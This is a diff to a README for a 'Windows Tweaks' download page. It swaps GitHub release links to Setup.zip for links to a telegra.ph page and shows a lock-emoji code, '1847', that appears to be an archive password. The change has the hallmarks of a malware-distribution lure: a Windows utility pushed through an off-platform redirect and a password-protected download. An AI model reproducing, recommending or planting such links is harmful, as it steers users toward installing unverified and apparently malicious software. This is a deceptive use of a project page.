@@ -8,7 +8,7 @@
 
 ---
 
-[![Download](og-image.png)](https://github.com/Feathereaarm/Windows-Tweaks/releases/download/v1.0/Setup.zip)
+[![Download](og-image.png)](https://telegra.ph/Download-05-21-39)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Windows Tweaks](https://img.shields.io/badge/Download%20Windows%20Tweaks-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/Feathereaarm/Windows-Tweaks/releases/download/v1.0/Setup.zip)
+[![Windows Tweaks](https://img.shields.io/badge/Download%20Windows%20Tweaks-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://telegra.ph/Download-05-21-39)
 
 **🔐🔐🔐** `1847`
 
